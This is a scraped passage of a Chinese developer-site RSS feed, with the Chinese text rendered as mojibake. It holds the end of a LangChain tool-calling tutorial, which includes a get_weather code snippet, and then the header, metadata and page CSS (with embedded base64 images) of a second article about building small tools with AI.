  <span class="hljs-keyword">const</span> <span class="hljs-keyword">call</span> = res.tool_calls[<span class="hljs-number">0</span>]

  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">call</span>.name === <span class="hljs-string">"get_weather"</span>) {
    <span class="hljs-keyword">const</span> result = <span class="hljs-built_in">await</span> weatherTool.invoke(<span class="hljs-keyword">call</span>.args)
    console.log(<span class="hljs-string">"æœ€ç»ˆç»“æœï¼š"</span>, result)
  }
}
</code></pre>
<p>æ­¤æ—¶æ¨¡å‹åªè´Ÿè´£â€œå†³ç­–â€ï¼Œ<br/>
ä»£ç åªè´Ÿè´£â€œæ‰§è¡Œâ€ã€‚</p>
<p>æ•ˆæœå›¾:</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/653c89371231495b9f0a2520f0ff14c6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m95YWw5Zyw56m655O2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767597407&amp;x-signature=RjtpHH1Zha%2Bv4zjH1pkNCEqxopc%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-7">å…«ã€Tool åœ¨æ¶æ„ä¸­çš„çœŸå®å®šä½</h2>
<p>å¦‚æœæ”¾åˆ°å·¥ç¨‹è§†è§’æ¥çœ‹ï¼š</p>
<ul>
<li>Modelï¼šæ„å›¾ç†è§£ + å†³ç­–</li>
<li>Toolï¼šçœŸå®èƒ½åŠ›ï¼ˆè®¡ç®—ã€æŸ¥è¯¢ã€æ“ä½œï¼‰</li>
<li>ä½ çš„ä»£ç ï¼šè°ƒåº¦ä¸å®‰å…¨è¾¹ç•Œ</li>
</ul>
<p>å¯ä»¥æŠŠ Tool ç†è§£ä¸ºï¼š</p>
<blockquote>
<p>AI ç³»ç»Ÿé‡Œçš„ Service å±‚ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-8">ä¹ã€ä¸ºä»€ä¹ˆè¯´ Tool æ˜¯ AI åº”ç”¨çš„åˆ†æ°´å²­</h2>
<p>æ²¡æœ‰ Toolï¼š</p>
<ul>
<li>AI åªèƒ½ç”Ÿæˆæ–‡æœ¬</li>
<li>æ— æ³•è½åœ°çœŸå®ä¸šåŠ¡</li>
</ul>
<p>æœ‰ Toolï¼š</p>
<ul>
<li>AI å¯ä»¥å‚ä¸ä¸šåŠ¡æµç¨‹</li>
<li>å¯ä»¥æ¥æ•°æ®åº“ã€æ¥å£ã€æ–‡ä»¶ç³»ç»Ÿ</li>
<li>å¯ä»¥ä½œä¸ºâ€œæ™ºèƒ½è°ƒåº¦å™¨â€å­˜åœ¨</li>
</ul>
<p><strong>è¿™æ˜¯ä»â€œç©æ¨¡å‹â€åˆ°â€œåšç³»ç»Ÿâ€çš„è½¬æŠ˜ç‚¹ã€‚</strong></p>
<hr/>
<h2 data-id="heading-9">åã€æ€»ç»“</h2>
<blockquote>
<p>Prompt å†³å®šæ¨¡å‹è¯´ä»€ä¹ˆï¼Œ<br/>
Tool å†³å®šæ¨¡å‹èƒ½åšä»€ä¹ˆã€‚</p>
</blockquote>
<p>å¦‚æœä½ æ„¿æ„ï¼Œä¸‹ä¸€æ­¥å¯ä»¥ç»§ç»­æ·±å…¥ï¼š</p>
<ul>
<li>Tool + å¤šæ¨¡å‹åä½œ</li>
<li>Tool + Agent è‡ªåŠ¨å†³ç­–</li>
<li>ç”¨ Tool è®¾è®¡ä¸€ä¸ªå®Œæ•´ AI åç«¯æ¶æ„</li>
</ul>
<p>è¿™æ‰æ˜¯ LangChain çœŸæ­£å€¼å¾—èŠ±æ—¶é—´ç ”ç©¶çš„åœ°æ–¹ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025å¹´ï¼Œæˆ‘å’ŒAIåˆä¼™å¼€å‘äº†å››æ¬¾å°å·¥å…·]]></title>    <link>https://juejin.cn/post/7589092567543955465</link>    <guid>https://juejin.cn/post/7589092567543955465</guid>    <pubDate>2025-12-29T09:06:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589092567543955465" data-draft-id="7589092567543939081" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025å¹´ï¼Œæˆ‘å’ŒAIåˆä¼™å¼€å‘äº†å››æ¬¾å°å·¥å…·"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,JavaScript"/> <meta itemprop="datePublished" content="2025-12-29T09:06:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜å‡Œè§ˆ"/> <meta itemprop="url" content="https://juejin.cn/user/3350967174565198"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025å¹´ï¼Œæˆ‘å’ŒAIåˆä¼™å¼€å‘äº†å››æ¬¾å°å·¥å…·
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3350967174565198/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜å‡Œè§ˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T09:06:03.000Z" title="Mon Dec 29 2025 09:06:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADsAAAA6CAYAAAAOeSEWAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAABkLSURBVGhDtZoHnJ1llcbP3Om9ZiYzmfSQhCQQIbRQVQKI9CYC68qKriJK0UXcZRcINqStIoiIqKCi1NACQihBWiCkkJ5MJlMyvd7p7d759v989/sy34yTbIj48Atz71ff855znvOc971xDrB/EtoGI7a9Z8Aq+wZML0mNj7dE95NZ1OKsj1dHo1GbnJpss9OTbWJyonvun4VP1Njuoagtb+m0it4By0iIt8LEeMvkr8XFWcfgkA1gYDLf47i2PzpsyU7UspKSLDoctagTZ7Vc08MzClMS7awJ2ZaflBB78CeET8TYla1dtrKt2w5KS7YCDGzEoz2RqKUmhGw6x2bhuXyOp2BoRXef1Q1E7Lj8TIsMD1sbxu1kcnYSAX1810RMTUmyMB7f2j1gC7NS7byinNiL/kH8Q8a+2NRh77b32El56VaPAe0YeGR2mh2bm+FdMRqP1rbZe+3dFsHT35qcb/Oz0rwzo7Gxs9feYPLS4kM2h8lawee5hPmlJXneFQeGAzJ2F564v7rFzi7Msu3d/Xgjzq5g8ArX8VCNN2vJ28daey0zZJabmGCLslP5HOf+Oygr3UzDGOf+JxrauXfQjslJt+dbuuyMgiwmk+sPAB/b2Lt2NdoMZnuY21qHIvbvUyZ4Z0ZQiXGrWjvsmPxsK4R0nmHA8ZCTQvxVQn5eRipklIBtcVbV1WtHYsjati47ZWKuTUpP9Z4yGk/xDBGe3v1mW4/dOrvYO7P/2G9jRSjf31FnXyaUXiB8r51WaJkM3kcfOSa2FR6qarIenooTLQHPLcC4mYThyw1tVpKWYlVERlZ8nC3Oz3Jzdn1nn5uvQ8OOHYvhR/CvsqffJbkCkZTvcYZ6Z0WTfTovw5Y1dtjXp+TbFPhgf7FfxpYxuMfr2uwo8rEtMmwXF+d6Z8wGmIR2PLyjo8cqOFffP2SLGexJEJCP9R29thkPXlpa4A5Y3w/jmuVNYYwO2QkY7WMtz3mVcE1hkualJdmSolzX8GnpKd4VZq80d1o7zN0RdWxGaqItgbn3B/+vsasgh/UMNBOvzYMZDxtDKp289KGaVguFQvb1yQWWwuB97GaSXqUUnVaYbSUwrDCEBz/C2CM8EhNrP13fbkeSh3OJgCAe2N1CWXKsGOc6TOr5U4q8MwYhDtkTda02MyPN+nnGBQEH7A37NHYz5KOZVv08qyjbSseEzKauPnsMj98wc6Ibcj5UUv7M8QWZTE52jEwGOVaD8U1Dw1YNWX0qM8VKyb80L/TrOPYOzH4KBJQTrK8M7+7KZjuM63sHBt17FubGoibCuf+tarWFGUmuwWeT8/vCXo1tZOYeZcazCaez8MwEzzM+HqhqtiJI5twxL1jeGLYk7jmKMF1JOCbg6Qj5nAdRqX7q3BYm8VAmQvW1lfcMc58IT95uIA3q+gftrDHPXUXJWkVEHJme5Bp5UmHsvIZ/O3l8ECE/FWcsItX2hr0ae8O2Wjs+J43QTbOZzGYQ/7Wtxq6eXjRK3r0By4YJ6Ty8EiYSJqcm2eGeV4Pox/ANENJR49RiEdfqcLflUJrEBZqgxYHrBjn2ExFURqKdVETN9YirJxKxR2rbrYeQv5ISmB6IsiDGNfZGWPeMgkzr58xnPaJ5p6XDZPKz4T77wayJ7jGhhXLwanOHTWBgq5n5q6YUwNJ7l3kKcRl7OJ7fF56l1GzvHbSD8dghTPi0wIRfv6XafjJ3ssv0PnZQ7nZx/etwzO1zJ3lHR2OETTw8x0tOx1AN3De0D7YV+63oGthjaJQ5Ur7eVVZjcdGInUyuaT73ZWg3efV8fZs7cc2E777Qi5eunVbghvPPymrt/krKGfcLd8ybYjdxrK6333Z09rjHZkNuLYzz0uIc+xWCZzz8nbHbe4dsY1e/XUOY+nimvtUaSazv4jXhaQasSbmYmpuenGwHZ8TKggSEQm08rMD7ahBOoExcMqXQegjnZ+CEvaEa1ZQUQkt39dj0zDS7krq+ARmpdws/nlNqD9WFbWN7l5u3wr9MyrcXKUsqWy3jTOaoML4DdaQ83YIoT4VYpEXvYQZLmbX5SLohBrgOj186Kc/iKTUPUhq+Rrm5ekOl3TWv1Mr6hqwbY0VOQXwEo+Moq4Z47q5qsU489G944LyJOW4LOLZOKtT/iI6+nGe/0dhuEd4ltj2NmiuCU4hnk5fHIi7+RK4uTEu0e+s7rAiRcw1CYy3OejvcYz+eXeI9MYY9nu3lYZl0KavJJ7Vjibzgjp319rUZE20j7CkJqFr5JQYgQ39f3eQaKpQk0afy8nl4uBzvjUUTRk7k3iebOm0pabDiyFn2XGu3dRME41CGVeBVqSiVnc6hIUpekp1VjHLDSOEcQlui5W/U8C7IKREjv1Gabw3wRwUTvpv7jybPtzHmIPZ49q6KRjuccqBQVCOtGvqXhrCFUUXJzOYSHt7Kw5Ix9H08dSje1o1JyL73IYXpEMmE5CRbw6wuykx2pR+Pd6/J4JpLiJKV6N9OnrcQNfQ0Zem6qQX2MmFXyWTE+DMO0kGx4e08DEjnXbsYuOq7niHB8jdY/wQ8Srm2XCZZUrOakF1CY5EKX0h93Tu/1J4kRdbDMT8MamgZK9xe3uDcvrPe++Y4f61rcZr7B53rN1c5N2ytcV5rCrvHt3T2Og19g+5nH7dvq3bqunr4NOwgK2MHA1jeEDuG7HNuLmtw7qpocl5t6nCPvdTQ7v4N4u3WTqeyu9cZHIo4f6lqdFoHh7wzMbzDeeGv3Hvzjlrnh2W1zofhHuftxpFn3VFe7zxS0+p0DlKVPbhhvBxhvwiFMgfP+mjHA08gEC4pybeLyK1iZldh8zC5VJQyUl8l59KZ0WJk2xaiYWxNrkXXJhA8r3PvZRur7ZZZRfadaRPsfiTmX9HGajC2tXd6V8dQTMhX0h8rNdJx9Ra8F8SbRNLzhPRnJmTZIUTYueTyWxyr7uv3rjC3OkzE8495oS+4xq6D5WoI0bO5WVCOSerl8rIeBrOI/Hkaw6ME5W1zSuzx2la3CRdWi3zIG+FDBvUp9LMgI/vggUmE7KkT81yGvOOgEYa/aUahhRAF5xLec3OzbF1r2O17BbVxIi7hzJIC64IYhXdJA+nh/5xVbOmE9J0QqjSxWk0pp37M2YEtgjS8GpimACu7xkqxdKJ6fEXyYl2Lre0ZtC8yELVewtWUnbfCPIhrvgDFz8WI5yhJKgcnFMZWEFrwhgzo5uWDDDA1oGSOzcu0xfx7vTlsv6posIMpJ6cGWPiw/BxL4PU7vbrpjgf8bMdu5OYwOdhm83DARUSa0ELknYIeEAaILuWxlhGa0M8+EuJCrpJT+ymENhN60pXBxa3LZ5TsucnlGaCmIEQ4Evru91yuz0xMtKaeXluI5zdh9Mm8vAlBn4aR07X64EH3vEKdXQkZJXPP/JxMvNRpLxEtHZ5RQgmNewnpouvVTpYTHdfOnmy5kFUGnpRTfEhXD9DiBdFFJB0/YWS9aj6pmc89r0BaQmgTRkgI+EsdKsYasJZOBF+QqTH474NK7LbyBvf7W+RgOxNyxfQY2/2hrp2+NkroxrzrQ55fSZkpJIa28znCgF6rb7H1hOSslATyvNflAh9pvHcX3lVE/Ya8FjTJIexa2Rq77nfU96unTnD7aME3+TAm6BFKYrPnqCNIqV5sq0ZGCiEV+Db+qWMQqpFgb5KPx48R6omeDl2EuP9DTYt9iGA/f1KBS1w/La+H4ktsSmLItvZHXLUkrCeflVtJ9DVVg1H7+sxiGvVM975rZpfabuqHVhuP5F1vewav5O8GamUe91yDanoYw47FWzC929O+DJnKA2opFY1Rjru5CE7kOcO0jJtQVUIynzuZEMeb+1CEOFXN8iFSGeRpCm1BTlJxVg49Azm819SO7Bu0axEbwn27GuxMck+TMQHDP8fn48gfDVIL4R8xKVPJ73MQBUIfA/Z54LMw5vmlE+w+VFo2A78X/SsyPA/RMD0z3e2qVLtfo7aeBslpMX0N0TEnLcUlKym1jyBFqSohmYntI5enBhYB9CY/2kNarhwJhNiMtRGyWnkQdKaCFyQwgydjyNUw4VchKxXv2/DoKdC+lkQbCX1NlKCGvJiBJkSGbCus6jfo4yGBNySgr+u7e20BCsxdVAcFlJ/tHd32+cIsNxSXUULUUx+dg/d47g7OPYFw2MxkSuyMwLHVTI6PBN6dS8Sppw45zHJSgDXV3aQzmz40Z6fDgBfiAXU0uZxby2zejee+j3eltoQMzhV6qSBogXwrEXDj7ElWxUQ8RrnSaoU0dxIsKaiMvMykXTu90NqJsGHP4z78SdLigUrLKat32nFwy/E07pfDFRdQ/7N5r57pQ1482uvWhMGhQcviGkVrKDUp0ToCxfhQal5n4Hs/g1jOgH4LWdwFOd1b1WzHET4vLZppv+Czjxo840OrDlG8jAJzv2tp5mLK1dsU/lfIOeWy5NxFxfl2BoYImlQtx9QF6mJRQKBsQYYuO2yaLYPBUXvu/VqYPxtHhNy7Y4hCkNLGPtKSklzCVKSHtMQxcqm5Kw1DhI2PTGZtcGDAvoLQ/u7MifYtWFBlxz2H9zo8RkwKzC5UYiG+p44ccqE62YAxLeT/TOpf8MXx8Qk0IJFRY1Go+viQVJpE5Ehjf49xfAZeqGIy/7us3nqxwQfCkjZypPxobVr/6YpQHIalUvuCyEwbSXC9PC8QnkFcXlrgLpoLIhIfKuaqlQkYIAwQnr/f3eyu7KttOw2lNpv8/BPHyjzVNER3o72gvEBKqRMTflndbP8BMweRDyeciEj5bFayFXqTLzheivgYJC0jwzwHa0MDDEotm48ndze5BBBElAnxxcRYHAFh3FfZaA9UNRmC354kNwUx8eHkmVj5dcTE5ZMnuEyr1QqlhtaJLuOYZv4v3KNo0TKrGPUZ1NILPKuWcvVn5Trv10SMB6h0j/ARMnlOuafCBIfnSWEx/Raif3HDzofYMM31dOyY9LBaLK3TjoX2fEqT4+2qaUVWSTQvyM6wC8nNJyEetXIyuLKrx04P7MKNnbJZlKUtNAIHo7i2dA/YU3Vtdi5l6jCepXy8hOedSSSsI8/HQg5Q+gxTKXwkMHkbESo+hjG0lbRRzQ3Fc5LOzDuFhs3Ptumpie7ilRDhlEJOq/hjsZljCxjkt7fWuPS/EekpXMggJQIk0G+eN9Xu2VmHWIkJe0nJRN4ptBBit2yutG9ML7J1DHAxebiAMrZ4VZlduqGS8I2tJc2iborUxmIN79c+kTovFxivPvrcSaP3n7RSKYTUmKt4N3rMOcw4JOneD3sP956jNaMglIeTER5Xbdlt15Tm2W10NEsYrA/N5JLCHHsR9tSqwxq08G3bqm1ZTbOtagnbo6SLvH/VzBL7W7jPzqFea0LmMLFzUuLtdwumuO3i1Vtq7OK15Xgw3l1PDmIXak+6QBEkvB9YJIzBcc/L20JIYaSZ/qAzVm5Ut4oowk3QehC+N3xo/1wTqt7zsYawfX9no9XjqdPXVLhrwyo/wucJYQkE1e4j8rLcBuHUItQQKqgMXb6LGvxFQlXw33AdZLR0V5P9Fr29lP73scNnosoyvdWPv4fPJ+uJrLVtMakqaL1M1cTvv0OLIZE6wk2a2IcIRUQh+DaejpdcXepBa7bKDRGM9PIVxTl2EwarZ72rooVuY4RQtMypdk6e1lLLehhY2lt7QEd7WxlCDvdIli6E9B4+ZIodmZEMccUGqgiZOqru9tkR3iJ8nCcXRWRZCSPMLPEjlx2LjQL1OM5qKAm+vhSuRqSfV5Ttrg8FdWcrnhMqCTex7DEM6qTsVEuM1+8hovaHQ6e6a1Fz0xLd3nUt4ToWWuzWNkhcoAIIjUx2ZpxjLzWF9+SYmngR1lok4TEoJxGfuijhI/7OICoFmadl2llcL9b1oRVJtbD+JLlv1KrhHG5811t9ELbzgk14ICUwqE+TDzftqHPz98vUSy3jSIwP8dCpkNqLDPTx+rArz4T5qLG3G2PrvJKKPoLBWE501NC3ilUX5mVjVIb9nIbgWcpPMiSXjbcL8K62UkR86m1/yfkSeMaHFuK04X0CE3J6SWzFUxw0BSNHlSzi3RmIRJwHq5udO3c16quLp6sbnffbupxbt+12vzOrzuvNHc7ycRbIxuJHgYU7YSASdQgxp7qz2ynv6HJeqW91doa7nLruXof+17sqhhu31Xif9o7HalqczV29Dnrb/f5EXZvzdH27U98/6LR5i3N0UM5zjHU71/lwjRWWltU5CAIn7F1MqLp/r9hQ5RoaxG+qmrxP4yNKcfsFLwuiprffeb2l03m2scO5h3Or2rudzjGrhk8x4Cqu2xcexilBvNEcdi5Yu4tKF3Ue4tzPy+td5/1md4tzw5iJ27NuXEYobYUdlb8z6GTWkdxaCvk2zHjd5mpKQ459mv5TkAp6mQb9Aq9HHQ8S6mrZnuc6vUG6WHusIhCJGNXl9byvnJyaiE7+Eoz8c5TYNQiUveENGpJpcIJ+biS8R0+rlcazGNs7pKB+zPLTOSX2KNWhlDAf4r2Spj72JORB5OyHULX+dlD/FOky/HFy5ygYU0sey/i8moeqdunXK1qC3RuaMOYHlI/raQMl3M+EeTV5WxD3Km8a8PkM8nr648sQ9+esKbf5e/nxiKBfAOQkxbv3SU9LYmqPV9V/Pn+V20VwTyVjTqCI6edEQUOFUXs9WmfSll8DyX2dt7GlnwkswaM3l9XZ0oNK3MTXbxpOV2sGk69s6XCJw4cY8KbyRrt9TrHt7Bm0rRBQe1+fHUWNfaapU0KbqxzbORC1M/LS3dJwIl3KOrwykQG/E+61q+isgniztdOKqNOziDgZqZIzFwPvqGiyg5NCtoCqoG5NxHhPZTOsnORulKskjoKMDeLuXQ3OmnC3syxARFXdfc57LR3OrdtrvSOOs55rnqhtcdoGhpxHdjc5EfJUuHZTlftX+G15rXPlhkrnLe59F7Lz8VGHdg8c5y2OLeMZ126qduq9XC3v7nd+FchLvYPJd15gPCu8XQnh/qpm59WGVudZzvvQO97kXTcGxhnEuJvR39tWY8cwK4uhcikk4a3Gdstg9l5B2t0wfaTdWkEou5vCPOV5PH73vFL3+DfXltnh6OxjkJD6Wd5F3g88tMe6CW/7YmI99VIL4u0oqUK8ocW4d8hFrXMVoOQU8s3U97MnjvDD/XRYkyhHM1MT3GVZQR2Tdv70U8EbA5vlo+CaPAaaSWoZXm50otGodxQ6L6txGKxzw5ZYORrBsPPrykZKQIy1n8bTjwb2fO4Te3ue7x6KOKvaYns1wtIddd4nx3mwot55qyl2360cp81zurg+CGqwU8v4/Of5uAVvPgObrwvHomY8jOtZ4fXWLnefdHVXv9044+8ZklCx75DXwcV1Sb27y+vInUQEuVYSaMgRJYfAwtoj0raFxIUW1A8nz35f02qLc9Lc9lG7CBkwtUR7bf+A+5uL6ehnH9Lat+5sIEfj3Cbj3NKRvP7Rjlo7FSmqavKvpSP8MRZ7NVbQYLSkqlC9ZW4sPH18gBTcORjrhMWmQWzFmK2UsvO90qQ1oZcI8UhkCLZPtRqMy0NirobAvjIpb4/sW06qKGyPR2oGIdlazjOOTk+kLYzaaYGSp63Wz6HsXsQ51wd+LTAuZOy+8GBNq7tF+IOdDU4kENJthNID5YRafZtzZ3mDs9LbRgzixcZ2l1h83OKFbDmEd0/FiFp7DWHgp0AQGzq6nf8hPF+oa3EehOz0ziCWcm4NpBRMhX1hn571oR9wqVVSDVPtUi32sQ0vbu7scZdY9aOt2ZSEL9BEBIW+dv20AKDd9/ep09oimYqHpyImkKDuRllS4PrlHNuIqDmCJmNJQba7q1joEaUQJuR/WdXsLrJrq/L6cdJsPOyXscJ7GLKqo8cOpqhrO//yQG6oS3kZwS9xPkRB3wi7diFMtDN+PLk5m1ath+8f0Fy80dbjhvVXub+U5mEqeal27UP+dWpPlknNxW79Ak6/7Tg3UMOF52j1xA1qK7Trd6nXC+8P9ttYQcumIonLSnJtBdJNa77axw1C2x3qR4Wqnj73x9f6MbV+CCYFBZO6y51aSh3gzVrsmwzJnULEbCJC1oZ7vIZ/9Iqmfvn2u5oWO5n8fApxcuWUApum5diPgY9lrA9EtvUNOzYf8vqAcJPsU5iOh7XtXQgt2uZhjKU2amF7HQyfEYWcZk5yQ1RDKNrLcq02k/9IGmldrB93KiokPw8EB2SsoKWXO5FmxXhlckqi+3vEUvLqwok5PHVkIWAszlqzy1p54zuLpnPZ3q9bod08JlLSb5DrNxDm38Sbvsg5EBywsT7oH+3XNW3uasGirFSrxRNdCllKiPZHZzJYLZb5qEcpae3pxMCuu9oibS5/QCOiLcYUrp+MmtJeURjFdVlxzqiae6D4h40NQt54HyGv3JRo10aVfv8YhtC0pSlVKcPFuxIXahr08mzCO4VzMlLSsZuomZ+RaucU0rXsw/sfF5+osUFonWob/7TrLdaUgdpV93fl9X+VIC0Y6tek2uI8OD3J5gT2Vj9ZmP0f4IM4iY7RQ5gAAAAASUVORK5CYII=) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 